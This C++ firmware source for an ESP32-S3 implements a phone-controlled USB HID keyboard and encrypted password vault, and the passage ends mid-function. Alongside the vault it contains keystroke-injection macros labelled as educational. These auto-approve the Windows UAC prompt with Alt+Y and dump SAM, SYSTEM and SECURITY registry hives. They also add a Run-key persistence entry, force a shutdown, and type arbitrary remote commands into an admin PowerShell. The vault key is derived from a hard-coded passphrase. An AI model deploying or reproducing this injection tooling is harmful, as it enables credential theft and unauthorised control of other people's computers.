/**
 * =============================================================================
 * device_main.cpp — ESP32-S3: USB HID Keyboard + Encrypted Password Vault
 * =============================================================================
 *
 * Features:
 *   1) Wi-Fi AP with WebServer + WebSocket
 *   2) Web keyboard — type on phone, output USB HID to PC
 *   3) Password vault — AES-256-CBC encrypted, stored in ESP32 NVS
 *   4) "Type to PC" — send vault passwords as USB HID keystrokes
 *
 * Hardware: ESP32-S3 DevKitC-1 with native USB
 * =============================================================================
 */

#include "shared_protocol.h"
#include "secrets.h"
#include <Arduino.h>
#include <Preferences.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <WebServer.h>
#include <WebSocketsServer.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <mbedtls/aes.h>
#include <mbedtls/md.h>

#include "index_html.h"
#include "lab_commands.h"

// =====================================================================
// Dual-serial helper
// =====================================================================
#define LOG(fmt, ...)                   \
  do                                    \
  {                                     \
    Serial.printf(fmt, ##__VA_ARGS__);  \
    Serial0.printf(fmt, ##__VA_ARGS__); \
  } while (0)

#define LOGLN(msg)        \
  do                      \
  {                       \
    Serial.println(msg);  \
    Serial0.println(msg); \
  } while (0)

// =====================================================================
// Global Objects
// =====================================================================
static USBHIDKeyboard Keyboard;
static WebServer server(WS_PORT);
static WebSocketsServer webSocket(81);

// =====================================================================
// Encrypted Vault Storage
// =====================================================================
#define VAULT_MAX 32
// VAULT_ACCESS_PIN is defined in secrets.h
static String vaultMasterPass;
static uint8_t vaultUnlockedClients = 0; // bitmask, up to 8 WS clients
static uint8_t vaultMasterFails = 0;
#define VAULT_MASTER_MAX_FAILS 5

struct VaultEntry
{
  String service;
  String user;
  String secret;
  uint8_t failedPins = 0;
};

static VaultEntry vault[VAULT_MAX];
static int vaultCount = 0;
static Preferences vaultPrefs;
static uint8_t vaultAesKey[32];

#define QUICK_ACTION_MAX 12
struct QuickAction
{
  String label;
  String type;
  String value;
};
static QuickAction quickActions[QUICK_ACTION_MAX];
static int quickActionCount = 0;

static String jsonEscape(const String &s)
{
  String out;
  out.reserve(s.length() + 4);
  for (unsigned int i = 0; i < s.length(); i++)
  {
    char c = s.charAt(i);
    switch (c)
    {
    case '"':
      out += "\\\"";
      break;
    case '\\':
      out += "\\\\";
      break;
    case '\n':
      out += "\\n";
      break;
    case '\r':
      out += "\\r";
      break;
    case '\t':
      out += "\\t";
      break;
    default:
      out += c;
    }
  }
  return out;
}

// =====================================================================
// Lab action helper: open Win+R, type one command from lab_commands.h
// =====================================================================
static void labRunWinR(const char *action, const char *cmd, bool elevated = false)
{
  if (cmd == nullptr || cmd[0] == '\0')
  {
    LOG("[Lab] %s: command not set — edit include/lab_commands.h\n", action);
    return;
  }
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(20);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.print(cmd);
  delay(300);
  if (elevated)
  {
    // Ctrl+Shift+Enter = "Run as administrator" from the Run dialog. This is
    // the documented Windows elevation path — the real full-screen UAC prompt
    // appears and a human must click Yes. Nothing is bypassed.
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
  }
  Keyboard.press(KEY_RETURN);
  delay(20);
  Keyboard.releaseAll();
  LOG("[Lab] Ran %s%s\n", action, elevated ? " (elevated, UAC)" : "");
#if LAB_UAC_AUTOYES
  if (elevated)
  {
    // Educational lesson (T1548.002): input from a *hardware* HID device
    // reaches the UAC secure desktop, so the consent prompt is not a human
    // gate against physical-class attacks. Alt+Y activates the Yes button.
    // Set LAB_UAC_AUTOYES 0 in lab_commands.h to restore human approval.
    delay(1500); // secure desktop takes a moment to appear
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');
    delay(20);
    Keyboard.releaseAll();
    LOG("[Lab] UAC auto-approved via Alt+Y (HID reaches secure desktop)\n");
  }
#endif
}

static void vaultDeriveKey()
{
  static const char pass[] = "PV-ESP32-Classroom-2026";
  mbedtls_md_context_t ctx;
  mbedtls_md_init(&ctx);
  mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), 0);
  mbedtls_md_starts(&ctx);
  mbedtls_md_update(&ctx, (const unsigned char *)pass, sizeof(pass) - 1);
  mbedtls_md_finish(&ctx, vaultAesKey);
  mbedtls_md_free(&ctx);
}

static void vaultSave()
{
  String plain;
  for (int i = 0; i < vaultCount; i++)
  {
    plain += vault[i].service + "\x1F" + vault[i].user + "\x1F" +
             vault[i].secret + "\x1F" + String(vault[i].failedPins);
    if (i < vaultCount - 1)
      plain += "\x1E";
  }

  if (plain.isEmpty())
  {
    vaultPrefs.remove("data");
    vaultPrefs.putInt("cnt", 0);
    LOG("[Vault] Cleared (0 entries)\n");
    return;
  }

  size_t plainLen = plain.length();
  uint8_t padVal = 16 - (plainLen % 16);
  size_t padLen = plainLen + padVal;

  uint8_t *padded = (uint8_t *)malloc(padLen);
  if (!padded)
    return;
  memcpy(padded, plain.c_str(), plainLen);
  memset(padded + plainLen, padVal, padVal);

  uint8_t iv[16];
  esp_fill_random(iv, 16);
  uint8_t ivCopy[16];
  memcpy(ivCopy, iv, 16);

  uint8_t *cipher = (uint8_t *)malloc(padLen);
  if (!cipher)
  {
    free(padded);
    return;
  }

  mbedtls_aes_context aes;
  mbedtls_aes_init(&aes);
  mbedtls_aes_setkey_enc(&aes, vaultAesKey, 256);
  mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, padLen, ivCopy, padded,
                        cipher);
  mbedtls_aes_free(&aes);

  size_t totalLen = 16 + padLen;
  uint8_t *blob = (uint8_t *)malloc(totalLen);
  if (!blob)
  {
    free(padded);
    free(cipher);
    return;
  }
  memcpy(blob, iv, 16);
  memcpy(blob + 16, cipher, padLen);

  vaultPrefs.putBytes("data", blob, totalLen);
  vaultPrefs.putInt("cnt", vaultCount);

  free(padded);
  free(cipher);
  free(blob);
  LOG("[Vault] Saved %d entries (encrypted %u bytes)\n", vaultCount,
      (unsigned)totalLen);
}

static void vaultLoad()
{
  vaultCount = 0;
  size_t len = vaultPrefs.getBytesLength("data");
  if (len < 32)
    return;

  uint8_t *blob = (uint8_t *)malloc(len);
  if (!blob)
    return;
  vaultPrefs.getBytes("data", blob, len);

  uint8_t iv[16];
  memcpy(iv, blob, 16);

  size_t cipherLen = len - 16;
  uint8_t *decrypted = (uint8_t *)malloc(cipherLen + 1);
  if (!decrypted)
  {
    free(blob);
    return;
  }

  mbedtls_aes_context aes;
  mbedtls_aes_init(&aes);
  mbedtls_aes_setkey_dec(&aes, vaultAesKey, 256);
  mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, cipherLen, iv, blob + 16,
                        decrypted);
  mbedtls_aes_free(&aes);

  uint8_t pad = decrypted[cipherLen - 1];
  if (pad > 0 && pad <= 16)
    cipherLen -= pad;
  decrypted[cipherLen] = 0;

  String data = String((char *)decrypted);
  int pos = 0;
  while (pos < (int)data.length() && vaultCount < VAULT_MAX)
  {
    int recEnd = data.indexOf('\x1E', pos);
    if (recEnd < 0)
      recEnd = data.length();
    String rec = data.substring(pos, recEnd);
    pos = recEnd + 1;

    int f1 = rec.indexOf('\x1F');
    if (f1 < 0)
      continue;
    int f2 = rec.indexOf('\x1F', f1 + 1);
    if (f2 < 0)
      continue;
    int f3 = rec.indexOf('\x1F', f2 + 1);

    vault[vaultCount].service = rec.substring(0, f1);
    vault[vaultCount].user = rec.substring(f1 + 1, f2);
    vault[vaultCount].secret =
        f3 >= 0 ? rec.substring(f2 + 1, f3) : rec.substring(f2 + 1);
    vault[vaultCount].failedPins =
        f3 >= 0 ? (uint8_t)rec.substring(f3 + 1).toInt() : 0;
    vaultCount++;
  }

  free(blob);
  free(decrypted);
  LOG("[Vault] Loaded %d entries from NVS\n", vaultCount);
}

static String vaultToJson()
{
  String json = "[";
  for (int i = 0; i < vaultCount; i++)
  {
    if (i > 0)
      json += ",";
    json += "{\"s\":\"" + jsonEscape(vault[i].service) + "\",\"u\":\"" +
            jsonEscape(vault[i].user) + "\"}";
  }
  json += "]";
  return json;
}

static void vaultAdd(const String &service, const String &user,
                     const String &secret)
{
  if (vaultCount >= VAULT_MAX)
    return;
  vault[vaultCount].service = service;
  vault[vaultCount].user = user;
  vault[vaultCount].secret = secret;
  vault[vaultCount].failedPins = 0;
  vaultCount++;
  vaultSave();
  LOG("[Vault] Added: %s / %s\n", service.c_str(), user.c_str());
}

static void vaultDel(int idx)
{
  if (idx < 0 || idx >= vaultCount)
    return;
  LOG("[Vault] Deleted: %s\n", vault[idx].service.c_str());
  for (int i = idx; i < vaultCount - 1; i++)
    vault[i] = vault[i + 1];
  vaultCount--;
  vault[vaultCount] = VaultEntry();
  vaultSave();
}

static void vaultAuthenticate(uint8_t client, int idx, const String &pin)
{
  if (idx < 0 || idx >= vaultCount)
  {
    webSocket.sendTXT(client, "VAULT:AUTH:INVALID");
    return;
  }

  if (pin == VAULT_ACCESS_PIN)
  {
    if (vault[idx].failedPins != 0)
    {
      vault[idx].failedPins = 0;
      vaultSave();
    }
    String response = "VAULT:SECRET:{\"i\":" + String(idx) +
                      ",\"p\":\"" + jsonEscape(vault[idx].secret) + "\"}";
    webSocket.sendTXT(client, response);
    return;
  }

  vault[idx].failedPins++;
  int remaining = 5 - vault[idx].failedPins;
  if (remaining <= 0)
  {
    vaultDel(idx);
    webSocket.sendTXT(client, "VAULT:AUTH:DELETED");
    webSocket.broadcastTXT("VAULT:DATA:" + vaultToJson());
    return;
  }

  vaultSave();
  webSocket.sendTXT(client, "VAULT:AUTH:FAIL:" + String(idx) + ":" +
                                String(remaining));
}

static bool quickActionKeyValid(String key)
{
  key.toUpperCase();
  if (key.length() == 1 && ((key[0] >= 'A' && key[0] <= 'Z') ||
                            (key[0] >= '0' && key[0] <= '9')))
    return true;
  if (key.startsWith("F"))
  {
    int n = key.substring(1).toInt();
    if (n >= 1 && n <= 12 && key == "F" + String(n))
      return true;
  }
  static const char *names[] = {
      "TAB", "ENTER", "ESC", "ESCAPE", "BACKSPACE",
      "DELETE", "INSERT", "HOME", "END", "PAGEUP",
      "PAGEDOWN", "SPACE", "UP", "DOWN", "LEFT",
      "RIGHT", "PRTSC", "PRINTSCREEN", "CAPSLOCK"};
  for (const char *name : names)
    if (key == name)
      return true;
  return false;
}

static bool quickActionComboValid(String combo)
{
  combo.trim();
  if (combo.isEmpty() || combo.length() > 48)
    return false;
  int keyCount = 0;
  int pos = 0;
  while (pos <= (int)combo.length())
  {
    int end = combo.indexOf('+', pos);
    if (end < 0)
      end = combo.length();
    String token = combo.substring(pos, end);
    token.trim();
    token.toUpperCase();
    if (token == "CTRL" || token == "CONTROL" || token == "SHIFT" ||
        token == "ALT" || token == "WIN" || token == "WINDOWS" ||
        token == "META")
    {
      // Modifier token.
    }
    else if (quickActionKeyValid(token))
    {
      keyCount++;
    }
    else
    {
      return false;
    }
    pos = end + 1;
    if (end == (int)combo.length())
      break;
  }
  return keyCount == 1;
}

static bool macroValueValid(const String &value)
{
  if (value.isEmpty() || value.length() > 500)
    return false;
  int stepCount = 0;
  int pos = 0;
  while (pos <= (int)value.length())
  {
    int end = value.indexOf('|', pos);
    if (end < 0)
      end = value.length();
    String step = value.substring(pos, end);
    step.trim();
    if (step.length() < 3 || step[1] != ':')
      return false;
    char sc = step[0];
    String sv = step.substring(2);
    if (sc == 's')
    {
      if (!quickActionComboValid(sv))
        return false;
    }
    else if (sc == 't')
    {
      if (sv.isEmpty())
        return false;
    }
    else if (sc == 'r')
    {
      if (sv.isEmpty() || sv.length() > 180)
        return false;
    }
    else if (sc == 'p')
    {
      // same format as the pwsh action: [a]<delayMs>:<command>
      String v = sv;
      if (v[0] == 'a')
        v = v.substring(1);
      int colon = v.indexOf(':');
      if (colon < 1)
        return false;
      int ms = v.substring(0, colon).toInt();
      if (ms < 500 || ms > 10000)
        return false;
      if ((int)v.length() <= colon + 1)
        return false;
    }
    else if (sc == 'd')
    {
      int ms = sv.toInt();
      if (ms < 50 || ms > 5000)
        return false;
    }
    else if (sc == 'k')
    {
      String k = sv;
      k.toUpperCase();
      if (!quickActionKeyValid(k))
        return false;
    }
    else
    {
      return false;
    }
    stepCount++;
    pos = end + 1;
    if (end == (int)value.length())
      break;
  }
  return stepCount >= 1 && stepCount <= 16;
}

static bool quickActionValueValid(const String &rawType,
                                  const String &rawValue)
{
  String type = rawType;
  String value = rawValue;
  type.trim();
  type.toLowerCase();
  value.trim();
  if (value.isEmpty() || value.indexOf('\x1E') >= 0 ||
      value.indexOf('\x1F') >= 0)
    return false;
  if (type == "macro")
    return macroValueValid(value);
  if (type == "pwsh")
  {
    if (value.length() > 500)
      return false;
    String v = value;
    if (v[0] == 'a')
      v = v.substring(1);
    int colon = v.indexOf(':');
    if (colon < 1)
      return false;
    int d = v.substring(0, colon).toInt();
    if (d < 500 || d > 10000)
      return false;
    return v.length() > (unsigned)(colon + 1);
  }
  if (value.length() > 180)
    return false;
  if (type == "shortcut")
    return quickActionComboValid(value);
  if (type == "run")
    return true;
  if (type == "link")
    return value.startsWith("https://") || value.startsWith("http://");
  if (type == "paste")
    return true;
  return true;
}

static void quickActionsSave()
{
  String data;
  for (int i = 0; i < quickActionCount; i++)
  {
    if (i)
      data += '\x1E';
    data += quickActions[i].label + "\x1F" + quickActions[i].type +
            "\x1F" + quickActions[i].value;
  }
  vaultPrefs.putString("qactions", data);
}

static void quickActionsLoad()
{
  quickActionCount = 0;
  String data = vaultPrefs.getString("qactions", "");
  int pos = 0;
  while (pos < (int)data.length() && quickActionCount < QUICK_ACTION_MAX)
  {
    int end = data.indexOf('\x1E', pos);
    if (end < 0)
      end = data.length();
    String record = data.substring(pos, end);
    int split1 = record.indexOf('\x1F');
    if (split1 > 0)
    {
      int split2 = record.indexOf('\x1F', split1 + 1);
      String label = record.substring(0, split1);
      String type = split2 >= 0 ? record.substring(split1 + 1, split2)
                                : String("shortcut");
      String value = split2 >= 0 ? record.substring(split2 + 1)
                                 : record.substring(split1 + 1);
      if (label.length() <= 24 && quickActionValueValid(type, value))
      {
        quickActions[quickActionCount++] = {label, type, value};
      }
    }
    pos = end + 1;
  }
}

static String quickActionsToJson()
{
  String json = "[";
  for (int i = 0; i < quickActionCount; i++)
  {
    if (i)
      json += ',';
    json += "{\"l\":\"" + jsonEscape(quickActions[i].label) +
            "\",\"t\":\"" + jsonEscape(quickActions[i].type) +
            "\",\"v\":\"" + jsonEscape(quickActions[i].value) + "\"}";
  }
  return json + "]";
}

static bool quickActionAdd(const String &rawLabel, const String &rawType,
                           const String &rawValue)
{
  String label = rawLabel;
  String type = rawType;
  String value = rawValue;
  label.trim();
  type.trim();
  type.toLowerCase();
  value.trim();
  if (type == "link" && !value.startsWith("https://") &&
      !value.startsWith("http://") && value.length() > 0)
    value = "https://" + value;
  if (quickActionCount >= QUICK_ACTION_MAX || label.isEmpty() ||
      label.length() > 24 || label.indexOf('\x1E') >= 0 ||
      label.indexOf('\x1F') >= 0 || !quickActionValueValid(type, value))
    return false;
  quickActions[quickActionCount++] = {label, type, value};
  quickActionsSave();
  return true;
}

static void quickActionDel(int idx)
{
  if (idx < 0 || idx >= quickActionCount)
    return;
  for (int i = idx; i < quickActionCount - 1; i++)
    quickActions[i] = quickActions[i + 1];
  quickActions[--quickActionCount] = QuickAction();
  quickActionsSave();
}

// =====================================================================
// HID Keycode -> ASCII (for web monitor display)
// =====================================================================
static String hidToAscii(uint8_t keycode, uint8_t modifier)
{
  bool shift = (modifier & 0x22);
  bool ctrl = (modifier & 0x11);

  if (keycode >= 0x04 && keycode <= 0x1D)
  {
    char c = 'a' + (keycode - 0x04);
    if (shift)
      c -= 32;
    if (ctrl)
      return String("Ctrl+") + String((char)('A' + (keycode - 0x04)));
    return String(c);
  }

  if (keycode >= 0x1E && keycode <= 0x27)
  {
    const char nums[] = "1234567890";
    const char shiftNums[] = "!@#$%^&*()";
    int idx = keycode - 0x1E;
    return String(shift ? shiftNums[idx] : nums[idx]);
  }

  switch (keycode)
  {
  case 0x28:
    return "[Enter]";
  case 0x29:
    return "[Esc]";
  case 0x2A:
    return "[Backspace]";
  case 0x2B:
    return "[Tab]";
  case 0x2C:
    return " ";
  case 0x2D:
    return shift ? String("_") : String("-");
  case 0x2E:
    return shift ? String("+") : String("=");
  case 0x2F:
    return shift ? String("{") : String("[");
  case 0x30:
    return shift ? String("}") : String("]");
  case 0x31:
    return shift ? String("|") : String("\\");
  case 0x33:
    return shift ? String(":") : String(";");
  case 0x34:
    return shift ? String("\"") : String("'");
  case 0x35:
    return shift ? String("~") : String("`");
  case 0x36:
    return shift ? String("<") : String(",");
  case 0x37:
    return shift ? String(">") : String(".");
  case 0x38:
    return shift ? String("?") : String("/");
  case 0x39:
    return "[CapsLock]";
  default:
    return keycode > 0 ? String("[0x") + String(keycode, HEX) + "]" : "";
  }
}

// =====================================================================
// Forward Declarations
// =====================================================================
static void forwardReportToPC(const kbd_report_t &report);
static void releaseAllKeys();

// =====================================================================
// Language Detection State Machine
// =====================================================================
enum LdState
{
  LD_IDLE,
  LD_ENSURE_CAPS_OFF,
  LD_WAIT_CAPS_OFF,
  LD_OPEN_RUN,
  LD_WAIT_RUN,
  LD_TYPE_CMD,
  LD_WAIT_TYPE,
  LD_PRESS_ENTER,
  LD_WAIT_RESULT,
  LD_DISMISS_ERROR,
  LD_CHECK_RESULT,
  LD_RESTORE_CAPS,
  LD_SEND_RESULT
};

static volatile bool capsLockLed = false;
static LdState ldState = LD_IDLE;
static unsigned long ldTimer = 0;
static String ldResult;

static void keyboardLedCb(void *, esp_event_base_t, int32_t,
                          void *event_data)
{
  auto *d = (arduino_usb_hid_keyboard_event_data_t *)event_data;
  capsLockLed = (d->leds & LED_CAPSLOCK) != 0;
}

static void ldTick()
{
  if (ldState == LD_IDLE)
    return;
  switch (ldState)
  {
  case LD_ENSURE_CAPS_OFF:
    if (capsLockLed)
    {
      Keyboard.press(KEY_CAPS_LOCK);
      delay(20);
      Keyboard.releaseAll();
      ldState = LD_WAIT_CAPS_OFF;
      ldTimer = millis();
    }
    else
    {
      ldState = LD_OPEN_RUN;
      ldTimer = millis();
    }
    break;
  case LD_WAIT_CAPS_OFF:
    if (!capsLockLed || millis() - ldTimer > 500)
    {
      ldState = LD_OPEN_RUN;
      ldTimer = millis();
    }
    break;
  case LD_OPEN_RUN:
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_WAIT_RUN;
    ldTimer = millis();
    LOG("[LangDetect] Win+R\n");
    break;
  case LD_WAIT_RUN:
    if (millis() - ldTimer > 800)
      ldState = LD_TYPE_CMD;
    break;
  case LD_TYPE_CMD:
  {
    const char *cmd =
        "powershell -w h -c \"(New-Object -Com WScript.Shell)"
        ".SendKeys('{CAPSLOCK}')\"";
    Keyboard.print(cmd);
    ldState = LD_WAIT_TYPE;
    ldTimer = millis();
    LOG("[LangDetect] Command typed\n");
    break;
  }
  case LD_WAIT_TYPE:
    if (millis() - ldTimer > 500)
      ldState = LD_PRESS_ENTER;
    break;
  case LD_PRESS_ENTER:
    Keyboard.press(KEY_RETURN);
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_WAIT_RESULT;
    ldTimer = millis();
    LOG("[LangDetect] Enter, waiting...\n");
    break;
  case LD_WAIT_RESULT:
    if (millis() - ldTimer > 3500)
      ldState = LD_DISMISS_ERROR;
    break;
  case LD_DISMISS_ERROR:
    Keyboard.press(KEY_ESC);
    delay(20);
    Keyboard.releaseAll();
    delay(200);
    Keyboard.press(KEY_ESC);
    delay(20);
    Keyboard.releaseAll();
    delay(100);
    ldState = LD_CHECK_RESULT;
    LOG("[LangDetect] Dismiss dialogs\n");
    break;
  case LD_CHECK_RESULT:
    if (capsLockLed)
    {
      ldResult = "EN";
      ldState = LD_RESTORE_CAPS;
      LOG("[LangDetect] LED ON -> English\n");
    }
    else
    {
      ldResult = "TH";
      ldState = LD_SEND_RESULT;
      LOG("[LangDetect] LED OFF -> Thai\n");
    }
    break;
  case LD_RESTORE_CAPS:
    Keyboard.press(KEY_CAPS_LOCK);
    delay(20);
    Keyboard.releaseAll();
    ldState = LD_SEND_RESULT;
    ldTimer = millis();
    break;
  case LD_SEND_RESULT:
    webSocket.broadcastTXT("LANG:" + ldResult);
    LOG("[LangDetect] Result: %s\n", ldResult.c_str());
    ldState = LD_IDLE;
    break;
  default:
    ldState = LD_IDLE;
    break;
  }
}

// =====================================================================
// WebSocket Event Handler
// =====================================================================
static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
                           size_t length)
{
  switch (type)
  {
  case WStype_CONNECTED:
    LOG("[WS] Client #%u connected\n", num);
    webSocket.sendTXT(num, "Connected to PassVault");
    break;
  case WStype_DISCONNECTED:
    LOG("[WS] Client #%u disconnected\n", num);
    if (num < 8)
      vaultUnlockedClients &= ~(1 << num);
    break;
  case WStype_TEXT:
  {
    String msg = String((char *)payload).substring(0, length);

    // --- Vault master password unlock ---
    if (msg.startsWith("VAULT:UNLOCK:"))
    {
      String pass = msg.substring(13);
      pass.trim();
      if (pass == vaultMasterPass)
      {
        if (num < 8)
          vaultUnlockedClients |= (1 << num);
        vaultMasterFails = 0;
        vaultPrefs.putUInt("masterfails", 0);
        webSocket.sendTXT(num, "VAULT:UNLOCK:OK");
      }
      else
      {
        vaultMasterFails++;
        vaultPrefs.putUInt("masterfails", vaultMasterFails);
        int remaining = VAULT_MASTER_MAX_FAILS - vaultMasterFails;
        if (remaining <= 0)
        {
          for (int i = vaultCount - 1; i >= 0; i--)
            vaultDel(i);
          vaultMasterFails = 0;
          vaultPrefs.putUInt("masterfails", 0);
          webSocket.broadcastTXT("VAULT:WIPED");
          webSocket.broadcastTXT("VAULT:DATA:" + vaultToJson());
        }
        else
        {
          webSocket.sendTXT(num, "VAULT:UNLOCK:FAIL:" + String(remaining));
        }
      }
      return;
    }
    if (msg.startsWith("VAULT:SETPASS:"))
    {
      if (num >= 8 || !(vaultUnlockedClients & (1 << num)))
      {
        webSocket.sendTXT(num, "VAULT:LOCKED");
        return;
      }
      String data = msg.substring(14);
      int tab = data.indexOf('\t');
      if (tab < 0)
      {
        webSocket.sendTXT(num, "VAULT:SETPASS:FAIL");
        return;
      }
      String curPass = data.substring(0, tab);
      String newPass = data.substring(tab + 1);
      curPass.trim();
      newPass.trim();
      if (curPass != vaultMasterPass)
      {
        webSocket.sendTXT(num, "VAULT:SETPASS:WRONG");
        return;
      }
      if (newPass.length() >= 4 && newPass.length() <= 64)
      {
        vaultMasterPass = newPass;
        vaultPrefs.putString("vaultpass", vaultMasterPass);
        webSocket.sendTXT(num, "VAULT:SETPASS:OK");
      }
      else
      {
        webSocket.sendTXT(num, "VAULT:SETPASS:FAIL");
      }
      return;
    }

    // --- Vault commands (require unlock) ---
    if (msg == "VAULT:LIST" || msg.startsWith("VAULT:ADD:") ||
        msg.startsWith("VAULT:DEL:") || msg.startsWith("VAULT:AUTH:"))
    {
      if (num >= 8 || !(vaultUnlockedClients & (1 << num)))
      {
        webSocket.sendTXT(num, "VAULT:LOCKED");
        return;
      }
    }

    if (msg == "VAULT:LIST")
    {
      webSocket.sendTXT(num, "VAULT:DATA:" + vaultToJson());
      return;
    }
    if (msg.startsWith("VAULT:ADD:"))
    {
      String data = msg.substring(10);
      int t1 = data.indexOf('\t');
      int t2 = (t1 >= 0) ? data.indexOf('\t', t1 + 1) : -1;
      if (t1 >= 0 && t2 >= 0)
      {
        vaultAdd(data.substring(0, t1), data.substring(t1 + 1, t2),
                 data.substring(t2 + 1));
        webSocket.broadcastTXT("VAULT:DATA:" + vaultToJson());
      }
      return;
    }
    if (msg.startsWith("VAULT:DEL:"))
    {
      int idx = msg.substring(10).toInt();
      vaultDel(idx);
      webSocket.broadcastTXT("VAULT:DATA:" + vaultToJson());
      return;
    }
    if (msg.startsWith("VAULT:AUTH:"))
    {
      String data = msg.substring(11);
      int tab = data.indexOf('\t');
      if (tab >= 0)
        vaultAuthenticate(num, data.substring(0, tab).toInt(),
                          data.substring(tab + 1));
      return;
    }
    if (msg == "QA:LIST")
    {
      webSocket.sendTXT(num, "QA:DATA:" + quickActionsToJson());
      return;
    }
    if (msg.startsWith("QA:ADD:"))
    {
      String data = msg.substring(7);
      int tab1 = data.indexOf('\t');
      int tab2 = tab1 >= 0 ? data.indexOf('\t', tab1 + 1) : -1;
      if (tab1 >= 0 && tab2 >= 0 &&
          quickActionAdd(data.substring(0, tab1),
                         data.substring(tab1 + 1, tab2),
                         data.substring(tab2 + 1)))
        webSocket.broadcastTXT("QA:DATA:" + quickActionsToJson());
      else
        webSocket.sendTXT(num, "QA:ERROR:Invalid shortcut or list full");
      return;
    }
    if (msg.startsWith("QA:DEL:"))
    {
      quickActionDel(msg.substring(7).toInt());
      webSocket.broadcastTXT("QA:DATA:" + quickActionsToJson());
      return;
    }

    // --- Config ---
    if (msg == "CFG:GET")
    {
      String cfg = vaultPrefs.getString("uiconfig", "{}");
      webSocket.sendTXT(num, "CFG:DATA:" + cfg);
      return;
    }
    if (msg.startsWith("CFG:SET:"))
    {
      String cfg = msg.substring(8);
      cfg.trim();
      if (cfg.length() > 0 && cfg.length() <= 512)
      {
        vaultPrefs.putString("uiconfig", cfg);
        webSocket.broadcastTXT("CFG:DATA:" + cfg);
      }
      return;
    }

    // --- Language Detection ---
    if (msg == "LANG:DETECT")
    {
      if (ldState == LD_IDLE)
      {
        ldState = LD_ENSURE_CAPS_OFF;
        ldTimer = millis();
        LOG("[LangDetect] Started\n");
      }
      return;
    }

    // --- Quick action "run": device-side Win+R typing at USB speed ---
    if (msg.startsWith("RUN:"))
    {
      String cmd = msg.substring(4);
      if (cmd.length() > 0)
        labRunWinR("quick-run", cmd.c_str());
      return;
    }

    // --- Quick action "paste": device-side typing at USB speed ---
    if (msg.startsWith("TYPE:"))
    {
      String text = msg.substring(5);
      if (text.length() > 0)
        Keyboard.print(text);
      LOG("[QA] Typed %u chars\n", text.length());
      return;
    }

    // --- Quick action "pwsh": device-side PowerShell launch + typing ---
    // Format: PSH:[a]<delayMs>:<command>  ('a' prefix = run as admin)
    if (msg.startsWith("PSH:"))
    {
      String body = msg.substring(4);
      bool admin = body[0] == 'a';
      if (admin)
        body = body.substring(1);
      int colon = body.indexOf(':');
      if (colon > 0)
      {
        int openDelay = body.substring(0, colon).toInt();
        String cmd = body.substring(colon + 1);
        if (openDelay < 500)
          openDelay = 500;
        if (openDelay > 10000)
          openDelay = 10000;
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print("powershell");
        delay(200);
        if (admin)
        {
          Keyboard.press(KEY_LEFT_CTRL);
          Keyboard.press(KEY_LEFT_SHIFT);
          Keyboard.press(KEY_RETURN);
          delay(20);
          Keyboard.releaseAll();
          delay(1000);
          Keyboard.press(KEY_LEFT_ARROW);
          delay(20);
          Keyboard.releaseAll();
          delay(100);
          Keyboard.press(KEY_RETURN);
          delay(20);
          Keyboard.releaseAll();
        }
        else
        {
          Keyboard.press(KEY_RETURN);
          delay(20);
          Keyboard.releaseAll();
        }
        delay(openDelay);
        if (cmd.length() > 0)
        {
          Keyboard.print(cmd);
          delay(200);
          Keyboard.press(KEY_RETURN);
          delay(20);
          Keyboard.releaseAll();
        }
        LOG("[QA] PowerShell%s ran\n", admin ? " (Admin)" : "");
      }
      return;
    }

    // --- Lab macros ---
    if (msg.startsWith("LAB:"))
    {
      String lab = msg.substring(4);
      if (lab == "shutdown10s" || lab == "shutdown10m")
      {
        const char *cmd = (lab == "shutdown10s")
                              ? "shutdown /s /f /t 10"
                              : "shutdown /s /t 600";
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(20);
        Keyboard.releaseAll();
        delay(800);
        Keyboard.print(cmd);
        delay(300);
        Keyboard.press(KEY_RETURN);
        delay(20);
        Keyboard.releaseAll();
        LOG("[Lab] Ran: %s\n", cmd);
      }
      else if (lab == "SAMDump")
      {
        // Educational lab demo: dumps SAM/SYSTEM/SECURITY hives to a visible
        // local folder. Elevation goes through the real UAC prompt (the user
        // must approve it), nothing leaves the machine, no cleanup.
        labRunWinR("SAMDump/elevate", LAB_SAMDUMP_ELEVATE_CMD, true);
        delay(2000); // UAC handled (auto-Alt+Y when LAB_UAC_AUTOYES=1)
        labRunWinR("SAMDump", LAB_SAMDUMP_CMD);
        LOG("[Lab] SAM hives dumped to C:\\LabSAM\n");
      }
      else if (lab == "screenshot")
      {
        labRunWinR("screenshot", LAB_SCREENSHOT_CMD);
        LOG("[Lab] Screenshot saved to C:\\LabSS\n");
      }
      else if (lab == "BUTTON1")
      {
        labRunWinR("BUTTON1", LAB_BUTTON1_CMD);
      }
      else if (lab == "Bu2")
      {
        labRunWinR("Bu2", LAB_BU2_CMD);
      }
      else if (lab == "Bu3")
      {
        labRunWinR("Bu3", LAB_BU3_CMD);
      }
      else if (lab == "Bu4")
      {
        labRunWinR("Bu4", LAB_BU4_CMD);
      }
      else if (lab == "Bu5")
      {
        labRunWinR("Bu5", LAB_BU5_CMD);
      }
      else if (lab == "Bu6")
      {
        labRunWinR("Bu6", LAB_BU6_CMD);
      }
      else if (lab == "persist")
      {
        // Educational lab demo (T1547.001): adds an HKCU Run key that opens
        // a harmless notepad file at next logon. User-level only, no UAC,
        // reversible with:
        //   reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LabPersist /f
        labRunWinR("persist/set", LAB_PERSIST_CMD);
        delay(1500);
        labRunWinR("persist/show", LAB_PERSIST_PROOF_CMD);
        LOG("[Lab] Persistence Run key 'LabPersist' created (HKCU)\n");
      }
